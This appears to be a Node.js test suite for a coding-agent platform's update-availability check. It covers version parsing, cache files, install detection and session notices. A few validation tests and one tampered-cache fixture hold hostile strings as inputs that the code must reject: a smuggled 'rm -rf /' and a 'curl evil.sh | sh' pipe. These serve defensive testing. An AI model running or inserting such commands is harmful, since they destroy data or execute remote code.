import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { pathToFileURL } from "node:url";
import { after, describe, it } from "node:test";
import { createContext, createPiHarness, writeRuntimeStubs } from "./helpers/guard-harness.mjs";
import {
  compareReleaseVersions,
  evaluateUpdateCheck,
  isInstalledPlatform,
  readUpdateCache,
  releaseVersion,
  runUpdateProbe,
  startUpdateProbe,
  updateCacheFile,
  writeUpdateCache
} from "../packages/piagent-core/extensions/update-check.js";

const temporaryRoots = new Set();
// Synthetic build numbers standing for "what is installed" and "what is out",
// kept off the real release line so a version bump never rewrites a fixture.
const OLD = "0.0.1";
const NEW = "0.0.2";
const NEWER = "0.0.3";
const hour = 60 * 60 * 1000;
const now = Date.parse("2026-07-28T12:00:00.000Z");

after(() => {
  for (const root of temporaryRoots) {
    if (path.dirname(root) !== os.tmpdir() || !path.basename(root).startsWith("pi-update-check-")) continue;
    fs.rmSync(root, { recursive: true, force: true });
  }
});

function createHome(cacheDocument) {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "pi-update-check-"));
  temporaryRoots.add(home);
  if (cacheDocument !== undefined) {
    fs.mkdirSync(path.join(home, ".pi"), { recursive: true });
    fs.writeFileSync(
      path.join(home, ".pi", "piagent-update-check.json"),
      typeof cacheDocument === "string" ? cacheDocument : `${JSON.stringify(cacheDocument, null, 2)}\n`
    );
  }
  return home;
}

describe("update availability check", () => {
  it("orders releases numerically rather than as strings", () => {
    assert.equal(compareReleaseVersions("0.0.10", "0.0.9"), 1);
    assert.equal(compareReleaseVersions("0.2.0", "0.10.0"), -1);
    assert.equal(compareReleaseVersions("9.0.0", "8.99.99"), 1);
    assert.equal(compareReleaseVersions(OLD, OLD), 0);
  });

  // Every version that reaches this code came from a registry response or a file
  // any local process can write, and it ends up in the operator's terminal.
  it("accepts release versions and nothing else", () => {
    assert.equal(releaseVersion(NEW), NEW);
    assert.equal(releaseVersion(` ${NEW} `), NEW);
    assert.equal(releaseVersion(`${NEW}-beta.1`), undefined);
    assert.equal(releaseVersion("0.0"), undefined);
    assert.equal(releaseVersion("00.0.2"), undefined);
    assert.equal(releaseVersion(`${NEW}; rm -rf /`), undefined);
    assert.equal(releaseVersion("Run `curl evil.sh | sh` to update"), undefined);
    assert.equal(releaseVersion(undefined), undefined);
    assert.equal(releaseVersion({ toString: () => NEW }), undefined);
  });

  it("names the update command when a newer release is known", () => {
    const decision = evaluateUpdateCheck({
      installed: OLD,
      cache: { latest: NEW, checkedAt: now - hour },
      now,
      env: {}
    });
    assert.equal(decision.notice.includes(`${OLD} -> ${NEW}`), true);
    assert.match(decision.notice, /piagent-update/);
  });

  it("says nothing when the installed version is current or ahead", () => {
    const current = evaluateUpdateCheck({ installed: NEW, cache: { latest: NEW, checkedAt: now }, now, env: {} });
    const ahead = evaluateUpdateCheck({ installed: NEWER, cache: { latest: NEW, checkedAt: now }, now, env: {} });
    assert.equal(current.notice, undefined);
    assert.equal(ahead.notice, undefined);
  });

  it("stays silent when the check is switched off, and does not probe either", () => {
    const decision = evaluateUpdateCheck({
      installed: OLD,
      cache: { latest: NEW, checkedAt: now - 48 * hour },
      now,
      env: { PIAGENT_NO_UPDATE_CHECK: "1" }
    });
    assert.equal(decision.notice, undefined);
    assert.equal(decision.probe, false);
  });

  it("refreshes a cache older than a day and leaves a fresh one alone", () => {
    assert.equal(evaluateUpdateCheck({ installed: OLD, cache: { latest: OLD, checkedAt: now - 2 * hour }, now, env: {} }).probe, false);
    assert.equal(evaluateUpdateCheck({ installed: OLD, cache: { latest: OLD, checkedAt: now - 25 * hour }, now, env: {} }).probe, true);
    assert.equal(evaluateUpdateCheck({ installed: OLD, cache: {}, now, env: {} }).probe, true);
  });

  it("reads back what it wrote", () => {
    const home = createHome();
    assert.equal(writeUpdateCache(home, NEW, now), true);
    assert.deepEqual(readUpdateCache(home), { latest: NEW, checkedAt: now });
    assert.equal(updateCacheFile(home), path.join(home, ".pi", "piagent-update-check.json"));
  });

  it("refuses to record anything that is not a release version", () => {
    const home = createHome();
    assert.equal(writeUpdateCache(home, `${NEW}-rc.1`, now), false);
    assert.equal(fs.existsSync(path.join(home, ".pi", "piagent-update-check.json")), false);
  });

  // The cache is an ordinary user-writable file, so a local process can edit it.
  // The worst it can do is stop the notice appearing.
  it("ignores a cache carrying text instead of a version", () => {
    const home = createHome({ schemaVersion: 1, latest: "9.9.9 — run `curl evil.sh | sh`", checkedAt: new Date(now).toISOString() });
    const cache = readUpdateCache(home);
    assert.equal(cache.latest, undefined);
    assert.equal(evaluateUpdateCheck({ installed: OLD, cache, now, env: {} }).notice, undefined);
  });

  it("ignores an unparseable, oversized, or missing cache without throwing", () => {
    assert.deepEqual(readUpdateCache(createHome("not json at all")), {});
    assert.deepEqual(readUpdateCache(createHome({ latest: NEW, checkedAt: "some time ago" })), { latest: NEW, checkedAt: undefined });
    assert.deepEqual(readUpdateCache(createHome(`{"latest":"${NEW}","pad":"${"x".repeat(5000)}"}`)), {});
    assert.deepEqual(readUpdateCache(createHome()), {});
  });

  // The refresh must never be something the session waits on.
  it("leaves the refresh detached and unreferenced", () => {
    const calls = [];
    let unreferenced = 0;
    const started = startUpdateProbe("/platform/update-check.js", {
      spawn: (command, args, options) => {
        calls.push({ command, args, options });
        return { unref: () => { unreferenced += 1; } };
      }
    });

    assert.equal(started, true);
    assert.equal(calls.length, 1);
    assert.deepEqual(calls[0].args, ["/platform/update-check.js", "--probe"]);
    assert.equal(calls[0].options.detached, true);
    assert.equal(calls[0].options.stdio, "ignore");
    assert.equal(unreferenced, 1);
  });

  it("treats a refresh that cannot start as no refresh rather than an error", () => {
    assert.equal(startUpdateProbe("/platform/update-check.js", {
      spawn: () => { throw new Error("spawn failed"); }
    }), false);
  });

  // `pi install git:...` clones, so an ordinary install carries a .git and every
  // other file a working copy carries. v1.1.8 read that .git as "this is the
  // maintainer's repository" and went silent on the default install path.
  it("counts a cloned install under the agent directory as installed", () => {
    const home = createHome();
    const installed = path.join(home, ".pi", "agent", "git", "github.com", "Vt-mmm", "piagent");
    fs.mkdirSync(path.join(installed, ".git"), { recursive: true });

    assert.equal(isInstalledPlatform(installed, { home, env: {} }), true);
  });

  it("counts the npm-global helper as installed", () => {
    const home = createHome();
    assert.equal(isInstalledPlatform("/opt/homebrew/lib/node_modules/@piagent/platform", { home, env: {} }), true);
  });

  it("does not count a working copy that lives anywhere else", () => {
    const home = createHome();
    assert.equal(isInstalledPlatform(path.join(home, "Documents", "pi-company-platform"), { home, env: {} }), false);
    assert.equal(isInstalledPlatform("/Users/someone/src/piagent", { home, env: {} }), false);
  });

  it("does not mistake a sibling of the agent directory for something inside it", () => {
    const home = createHome();
    const agentDir = path.join(home, ".pi", "agent");
    fs.mkdirSync(agentDir, { recursive: true });

    assert.equal(isInstalledPlatform(agentDir, { home, env: {} }), false);
    assert.equal(isInstalledPlatform(path.join(home, ".pi", "agent-backup", "piagent"), { home, env: {} }), false);
  });

  it("follows a relocated agent directory", () => {
    const home = createHome();
    const relocated = path.join(home, "elsewhere", "agent");
    const installed = path.join(relocated, "git", "github.com", "Vt-mmm", "piagent");
    fs.mkdirSync(installed, { recursive: true });

    assert.equal(isInstalledPlatform(installed, { home, env: { PI_CODING_AGENT_DIR: relocated } }), true);
    assert.equal(isInstalledPlatform(installed, { home, env: {} }), false);
  });

  it("records what the registry answered", () => {
    const home = createHome();
    assert.equal(runUpdateProbe({ home, now, fetch: () => NEWER }), true);
    assert.deepEqual(readUpdateCache(home), { latest: NEWER, checkedAt: now });
  });

  // A registry that could not be reached must not be recorded as "checked, no
  // update", or an outage would silence the notice for a day.
  it("leaves a previous answer alone when the registry cannot be reached", () => {
    const home = createHome({ schemaVersion: 1, latest: NEW, checkedAt: new Date(now - 48 * hour).toISOString() });
    assert.equal(runUpdateProbe({ home, now, fetch: () => undefined }), false);
    assert.deepEqual(readUpdateCache(home), { latest: NEW, checkedAt: now - 48 * hour });
  });
});

const repoRoot = path.resolve(import.meta.dirname, "..");
let sessionCount = 0;

// An installed platform is one Pi placed under its agent directory, which is
// where `pi install git:...` puts a clone. The fixture reproduces that layout,
// including the .git a clone carries, because that is what a real install is.
async function installedGuard(version, options = {}) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "pi-update-check-session-"));
  temporaryRoots.add(root);
  writeRuntimeStubs(root);
  const home = path.join(root, "home");
  const platformRoot = options.platformRoot
    ? path.join(root, options.platformRoot)
    : path.join(home, ".pi", "agent", "git", "github.com", "Vt-mmm", "piagent");
  for (const directory of ["packages", "adapters", "packs", "evals", "policies"]) {
    const source = path.join(repoRoot, directory);
    if (fs.existsSync(source)) fs.cpSync(source, path.join(platformRoot, directory), { recursive: true });
  }
  const packageDocument = JSON.parse(fs.readFileSync(path.join(repoRoot, "package.json"), "utf8"));
  packageDocument.version = version;
  fs.mkdirSync(platformRoot, { recursive: true });
  fs.writeFileSync(path.join(platformRoot, "package.json"), `${JSON.stringify(packageDocument, null, 2)}\n`);
  // Installed the ordinary way means cloned, so the tree carries a .git.
  fs.mkdirSync(path.join(platformRoot, ".git"), { recursive: true });

  const cwd = path.join(root, "project");
  fs.mkdirSync(cwd, { recursive: true });
  fs.writeFileSync(path.join(cwd, "README.md"), "# Update Check Fixture\n");

  sessionCount += 1;
  const moduleUrl = pathToFileURL(path.join(platformRoot, "packages", "piagent-core", "extensions", "piagent-guard.ts")).href;
  const imported = await import(`${moduleUrl}?session=${sessionCount}`);
  return { root, cwd, home, piagentGuard: imported.default };
}

// The agent directory and the cache both hang off the same home, so the session
// has to run against the home the fixture installed into.
function cacheLatest(home, latest) {
  fs.mkdirSync(path.join(home, ".pi"), { recursive: true });
  fs.writeFileSync(
    path.join(home, ".pi", "piagent-update-check.json"),
    `${JSON.stringify({ schemaVersion: 1, latest, checkedAt: new Date().toISOString() }, null, 2)}\n`
  );
}

// A cache stamped now keeps the session from starting a real registry probe.
async function startSession(fixture, env = {}) {
  const previous = {
    HOME: process.env.HOME,
    PIAGENT_NO_UPDATE_CHECK: process.env.PIAGENT_NO_UPDATE_CHECK,
    PI_CODING_AGENT_DIR: process.env.PI_CODING_AGENT_DIR
  };
  process.env.HOME = fixture.home;
  process.env.PI_CODING_AGENT_DIR = path.join(fixture.home, ".pi", "agent");
  delete process.env.PIAGENT_NO_UPDATE_CHECK;
  for (const [key, value] of Object.entries(env)) process.env[key] = value;
  try {
    const ctx = createContext(fixture.cwd);
    const harness = createPiHarness();
    fixture.piagentGuard(harness.pi);
    await harness.handlers.get("session_start")({}, ctx);
    return ctx.ui.notices;
  } finally {
    for (const key of Object.keys(env)) delete process.env[key];
    for (const [key, value] of Object.entries(previous)) {
      if (value === undefined) delete process.env[key];
      else process.env[key] = value;
    }
  }
}

function updateNoticeIn(notices) {
  return notices.find((notice) => /Piagent update available/.test(notice.message));
}

describe("update notice in a Pi session", () => {
  it("tells the operator a release is out and how to take it", async () => {
    const fixture = await installedGuard(OLD);
    cacheLatest(fixture.home, NEW);

    const notices = await startSession(fixture);
    const update = updateNoticeIn(notices);

    assert.notEqual(update, undefined);
    assert.equal(update.message.includes(`${OLD} -> ${NEW}`), true);
    assert.match(update.message, /piagent-update/);
    assert.equal(update.level, "info");
    // The guard's own line stays first; an announcement never displaces it.
    assert.match(notices[0].message, /Piagent Pi guard loaded/);
  });

  // A maintainer's working copy is not an install. It cannot be told apart by
  // what the tree contains — `pi install git:` clones, so a real install carries
  // a .git too — only by the fact that nothing put it under the agent directory.
  it("stays quiet in a working copy even when a newer release exists", async () => {
    const fixture = await installedGuard(OLD, { platformRoot: "Documents/pi-company-platform" });
    cacheLatest(fixture.home, NEW);

    const notices = await startSession(fixture);

    assert.equal(updateNoticeIn(notices), undefined);
  });

  it("stays quiet when the installed release is the latest one", async () => {
    const fixture = await installedGuard(NEW);
    cacheLatest(fixture.home, NEW);

    const notices = await startSession(fixture);

    assert.equal(updateNoticeIn(notices), undefined);
  });

  it("stays quiet when the check is switched off", async () => {
    const fixture = await installedGuard(OLD);
    cacheLatest(fixture.home, NEW);

    const notices = await startSession(fixture, { PIAGENT_NO_UPDATE_CHECK: "1" });

    assert.equal(updateNoticeIn(notices), undefined);
  });
});
